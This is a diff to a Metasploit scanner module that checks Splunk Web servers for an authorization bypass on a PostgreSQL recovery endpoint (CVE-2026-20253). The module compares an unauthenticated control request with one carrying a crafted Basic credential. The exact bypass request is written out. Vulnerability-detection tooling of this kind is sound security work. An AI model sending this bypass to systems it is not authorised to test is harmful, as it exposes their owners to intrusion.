@@ -1,3 +1,5 @@
+# frozen_string_literal: true
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -63,40 +65,63 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # The recovery endpoint, reached through the Splunk Web __raw proxy. A
-  # non-Splunk (Basic) credential is enough to pass an affected server's
-  # (absent) authorization check; "dag:" is the credential used by the public
-  # detection artifact.
-  def probe
+  # POST to the recovery endpoint, reached through the Splunk Web __raw proxy.
+  # Pass the Basic credential ("dag:", the value used by the public detection
+  # artifact) to reach the recovery endpoint past an affected server's (absent)
+  # authorization check; an empty header set is the unauthenticated control.
+  def probe(extra_headers = {})
     send_request_cgi(
       {
         'method' => 'POST',
         'uri' => normalize_uri(target_uri.path, datastore['LOCALE'], 'splunkd', '__raw', 'v1', 'postgres', 'recovery', 'backup'),
-        'headers' => { 'Authorization' => 'Basic ZGFnOg==' }
+        'headers' => extra_headers
       }
     )
   end
 
+  # Confirm the target is Splunk Web before interpreting the recovery-endpoint
+  # behaviour, and register it as a service.
+  def fingerprint_splunk_web
+    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, datastore['LOCALE'], 'account', 'login'))
+    return false unless res
+    return false unless res.headers['Server'].to_s.include?('Splunkd') ||
+                        res.get_cookies.to_s.include?('splunkweb') ||
+                        res.body.to_s.include?('Splunk')
+
+    report_service(host: rhost, port: rport, proto: 'tcp', name: (ssl ? 'https' : 'http'), info: 'Splunk Web')
+    true
+  end
+
   def run_host(_ip)
-    res = probe
-    unless res
+    fingerprint_splunk_web
+
+    # Control: with no Authorization header the Splunk Web __raw proxy returns
+    # HTTP 401 on both affected and patched builds, so a bare 400 is not by
+    # itself a bypass signal.
+    control = probe
+    # Bypass: a non-Splunk Basic credential passes an affected server's (absent)
+    # authorization check and reaches the recovery endpoint, which fails to
+    # decode the empty body (HTTP 400 "Failed to decode request").
+    bypass = probe('Authorization' => 'Basic ZGFnOg==')
+
+    unless control && bypass
       vprint_error("#{peer} - No response from the Splunk Web recovery endpoint")
       return
     end
 
-    if res.code == 400 && res.body.to_s.include?('Failed to decode request')
-      print_good("#{peer} - Vulnerable: the PostgreSQL sidecar recovery endpoint accepted an unauthenticated request (CVE-2026-20253)")
+    if control.code == 401 && bypass.code == 400 && bypass.body.to_s.include?('Failed to decode request')
+      print_good("#{peer} - Vulnerable: a non-Splunk Basic credential bypassed authorization on the PostgreSQL sidecar recovery endpoint (CVE-2026-20253)")
       report_vuln(
         host: rhost,
         port: rport,
         name: name,
-        info: 'Unauthenticated access to /splunkd/__raw/v1/postgres/recovery/backup (HTTP 400 "Failed to decode request")',
+        info: 'Auth bypass on /splunkd/__raw/v1/postgres/recovery/backup: no-auth -> HTTP 401, Basic-auth -> HTTP 400 "Failed to decode request"',
         refs: references
       )
-    elsif res.code == 401 && res.body.to_s.include?('Splunk token')
+    elsif bypass.code == 401 && bypass.body.to_s.include?('Splunk token')
       print_status("#{peer} - Not vulnerable: the recovery endpoint requires a Splunk token (patched)")
     else
-      vprint_status("#{peer} - PostgreSQL sidecar recovery endpoint not detected (HTTP #{res.code}); likely not installed or not Splunk Web")
+      vprint_status("#{peer} - Auth-bypass signature not present (control HTTP #{control.code}, bypass HTTP #{bypass.code}); not confirmed vulnerable")
     end
   end
 end
